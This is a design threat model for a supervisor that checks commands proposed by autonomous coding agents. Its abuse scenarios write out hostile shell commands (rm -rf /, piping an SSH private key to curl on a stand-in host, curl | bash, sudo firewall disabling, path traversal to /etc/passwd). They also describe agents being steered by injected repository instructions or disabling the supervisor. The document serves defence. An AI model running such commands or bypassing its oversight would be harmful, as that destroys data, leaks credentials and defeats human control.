# AMJ Threat Model


## Trust Boundaries

### 1. User

**Trust level:** Trusted authority.

The user is the final authority over the AMJ session.

The user may:

- configure AMJ policies;
- explicitly approve actions;
- deny actions;
- terminate a session;
- grant or revoke capabilities.

AMJ should protect the user from accidental or misleading requests produced by an autonomous agent, but ultimately explicit user decisions take precedence.

---

### 2. AMJ Supervisor / Runtime

**Trust level:** Trusted computing base.

The AMJ supervisor is the main security enforcement component.

It sits between the autonomous agent and sensitive system resources and is responsible for:

- observing proposed actions;
- evaluating actions against deterministic security policies;
- determining their risk level;
- automatically allowing known-safe actions;
- asking the user when explicit authorization is required;
- explaining, in clear and understandable human language, what a command or action will do before asking the user to approve it;
- highlighting the relevant security impact or risk of the action when user approval is required;
- denying prohibited actions;
- terminating a session when necessary.

A compromise or bypass of the AMJ supervisor may invalidate the security guarantees of the system.

When AMJ requires user approval, it must not rely only on the raw command text. It should provide a concise explanation of the action's intended effect so that the user can make an informed decision. For example, AMJ should explain whether a command modifies files, deletes data, accesses the network, reads credentials, changes system configuration, or performs another security-sensitive operation.

The intended control flow is:

```text
Autonomous Agent
       |
       v
AMJ Supervisor
       |
       v
Host / Workspace / Network / Other Resources
```

The autonomous agent should not be able to bypass AMJ and directly perform monitored actions.
---

### 3. Autonomous Agent

**Trust level:** Untrusted.

Autonomous agents such as Codex or Claude Code must be treated as potentially unsafe.

An agent may:

- generate an incorrect command;
- misunderstand user intent;
- attempt destructive actions;
- be influenced by malicious repository content;
- be affected by prompt injection;
- attempt to access sensitive information;
- attempt to bypass AMJ controls.

AMJ must evaluate the actual requested action rather than trusting the agent's explanation of what the action is supposed to do.

---

### 4. Host Operating System

**Trust level:** Trusted infrastructure, protected from the agent.

The host operating system contains resources outside the scope of normal agent operation.

Examples include:

- system configuration;
- operating-system files;
- installed applications;
- running processes;
- other users' data;
- devices;
- system services.

Actions affecting the host operating system generally represent a stronger security boundary than actions limited to the project workspace.

The agent should not automatically receive unrestricted host access.

---

### 5. Workspace

**Trust level:** Partially trusted and agent-accessible.

The workspace contains the files associated with the task currently being performed by the agent.

Examples include:

- source code;
- configuration files;
- build artifacts;
- tests;
- documentation.

Agents are normally expected to read and modify workspace content.

However, workspace contents themselves must not be fully trusted. A repository may contain malicious scripts, instructions, dependencies, or prompt-injection content.

AMJ must therefore distinguish between access to the intended workspace and access to resources outside it.

---

### 6. Network and External Services

**Trust level:** Untrusted external environment.

Network access crosses a major trust boundary.

External resources may include:

- websites;
- APIs;
- package registries;
- Git repositories;
- remote servers;
- cloud services.

Network operations introduce risks such as:

- data exfiltration;
- downloading malicious content;
- sending credentials;
- interacting with attacker-controlled services;
- executing remote content.

AMJ should consider both outbound connections and untrusted responses received from external services.

---

### 7. Credentials and Secrets

**Trust level:** Sensitive resources with restricted access.

Credentials include SSH private keys, API tokens, passwords, cloud credentials, and secret environment variables.

Workspace access does not automatically grant permission to access secrets. Reading credentials or passing them to an agent, child process, or external service crosses this boundary and requires explicit authorization under deterministic policy.

ML recommendations must never override a deterministic hard deny on credential access or disclosure.

## Protected Assets

AMJ is intended to protect resources and security properties that could be affected by actions proposed by an autonomous agent.

The initial protected assets are:

### Workspace Data

Source code, configuration files, documentation, build files, and other project data contained in the authorized workspace.

AMJ should protect against unintended deletion, corruption, or modification of workspace data.

### Host Filesystem and System State

Files and configuration outside the authorized workspace, including:

- user files;
- operating-system files;
- system configuration;
- installed applications;
- system services.

The autonomous agent should not gain unrestricted access to host resources simply because it can operate inside a workspace.

### Credentials and Secrets

Sensitive authentication material such as:

- SSH private keys;
- API keys;
- authentication tokens;
- passwords;
- cloud credentials;
- secret environment variables;
- credential stores.

AMJ should prevent unauthorized reading, modification, or exfiltration of these resources.

### Host Processes and Execution Environment

AMJ should protect the integrity of processes running on the host and prevent an agent from unexpectedly executing privileged or dangerous programs.

This includes preventing unintended privilege escalation, dangerous child processes, and actions that interfere with unrelated host processes.

### Network Access and Data

Outbound network access is considered security-sensitive.

AMJ should protect against:

- unauthorized communication with external services;
- transmission of sensitive information;
- unexpected downloads;
- interactions with attacker-controlled endpoints.

### AMJ Security Controls

The AMJ supervisor, its configuration, policies, and decision-making mechanisms are themselves protected assets.

An autonomous agent must not be able to disable, modify, bypass, or terminate AMJ security controls in order to perform actions without supervision.

### Host Availability and Resources

Host resources such as CPU time, memory, storage, process slots, and network bandwidth are protected against uncontrolled consumption.

An autonomous agent should not be able to intentionally or accidentally exhaust resources in a way that makes the host or AMJ unavailable.

---

## Attacker Assumptions

For the initial AMJ threat model, the autonomous agent is considered untrusted.

AMJ assumes that an agent may behave dangerously because of bugs, incorrect reasoning, malicious instructions, prompt injection, compromised dependencies, or intentionally adversarial behavior.

In particular, AMJ assumes that an autonomous agent may:

- propose arbitrary commands or actions available through its execution interface;
- attempt to read or modify files outside the authorized workspace;
- attempt to access credentials or other secrets;
- attempt to transmit sensitive information to external systems;
- initiate unexpected outbound network connections;
- execute or spawn additional processes;
- attempt privilege escalation;
- attempt to disable or bypass AMJ;
- combine apparently safe operations in ways that produce unsafe behavior;
- attempt to consume excessive CPU, memory, storage, processes, or network resources.

Workspace contents are also considered potentially untrusted. Source files, documentation, scripts, dependencies, or other repository content may contain malicious instructions intended to influence the autonomous agent.

External services and network responses are considered untrusted and may attempt to influence the agent or provide malicious content.

For v0, the AMJ supervisor/runtime itself is part of the trusted computing base. The threat model assumes that the AMJ implementation and the underlying host operating system have not already been compromised by an attacker with privileges outside the autonomous-agent session.

The user's explicit authorization is considered authoritative, although AMJ should provide an understandable explanation of security-sensitive actions so that the user can make an informed decision.



## Non-goals

The initial threat model does not promise to:

- protect against an already compromised host operating system or AMJ supervisor;
- supervise unrelated processes outside the AMJ session;
- guarantee that an agent's output is correct or that downloaded code is safe;
- undo damage caused by actions explicitly permitted by the configured policy;
- implement sandboxing or hard-deny enforcement as part of SEC-001, which defines security primitives and this threat model.

## Security invariant

ML components may provide recommendations, classifications, or risk scores, but they are not authoritative security decision makers.

A deterministic hard-deny rule must always take precedence over an ML recommendation.

In particular:

```text
deterministic hard deny > ML recommendation
```

An ML component must never override a deterministic `DENY` or transform another mandatory security restriction into `ALLOW`.


## Abuse Scenarios

The following scenarios describe concrete ways in which an autonomous agent could perform unsafe or unintended actions.

### 1. Destructive File Deletion

An autonomous agent attempts to execute a command such as:

```bash
rm -rf /
```

or deletes files outside the intended workspace.

**Risk:** Critical system or user data could be permanently destroyed.

**Expected AMJ behavior:** The action must not be automatically approved. AMJ should deny it or require explicit user authorization depending on policy.

---

### 2. Credential or Secret Exfiltration

The agent attempts to read sensitive files such as SSH private keys, API tokens, or environment variables and send them to an external server.

Example:

```bash
cat ~/.ssh/id_ed25519 | curl -X POST https://example.com
```

**Risk:** Authentication credentials could be stolen and used to compromise other systems.

**Expected AMJ behavior:** AMJ should detect both access to protected credentials and the attempt to transmit them over the network and deny the action.

---

### 3. Privilege Escalation

The agent attempts to execute commands using elevated privileges.

Example:

```bash
sudo systemctl disable firewall
```

**Risk:** The agent could modify security-critical host configuration or gain capabilities beyond those intended for the session.

**Expected AMJ behavior:** Privilege-escalating actions should never be automatically approved unless explicitly permitted by policy.

---

### 4. Executing Untrusted Remote Code

The agent downloads code from an external source and executes it directly.

Example:

```bash
curl https://example.com/install.sh | bash
```

**Risk:** The downloaded content may be malicious or may change after AMJ evaluates the original command.

**Expected AMJ behavior:** AMJ should treat downloading and directly executing remote content as a high-risk action and require user approval or deny it.

---

### 5. Escaping the Workspace

The agent attempts to access or modify files outside the workspace.

Example:

```bash
cat ../../../../etc/passwd
```

or:

```bash
rm -rf ../other-project
```

**Risk:** The agent could access unrelated user data or modify parts of the host system that are outside its intended scope.

**Expected AMJ behavior:** AMJ should distinguish workspace resources from external host resources and apply stronger restrictions to accesses outside the workspace.

---

### 6. Hiding Dangerous Behavior Inside a Compound Command

The agent combines a harmless operation with a dangerous one.

Example:

```bash
cargo test && rm -rf ~/Documents
```

**Risk:** A simple classification based only on the beginning or apparent purpose of the command could incorrectly classify the complete action as safe.

**Expected AMJ behavior:** AMJ must analyze the complete command, including chained commands, pipelines, substitutions, and redirections.

---

### 7. Malicious Repository Instructions

The agent reads repository content containing instructions intended to manipulate it, such as a malicious `README.md`, source-code comment, or configuration file telling the agent to execute unsafe commands.

**Risk:** Repository content may act as a prompt-injection vector and cause the agent to request dangerous actions.

**Expected AMJ behavior:** AMJ must treat actions requested by the agent independently of the reason the agent gives for executing them. Repository instructions must not bypass deterministic security rules.

---

### 8. Disabling or Bypassing AMJ

The agent attempts to terminate AMJ, modify its configuration, launch a shell outside its supervision, or invoke another mechanism that allows commands to execute without AMJ inspection.

**Risk:** Once AMJ is bypassed, subsequent actions may execute without security enforcement.

**Expected AMJ behavior:** Attempts to disable, modify, or bypass the supervisor should be treated as critical security violations and may result in immediate session termination.
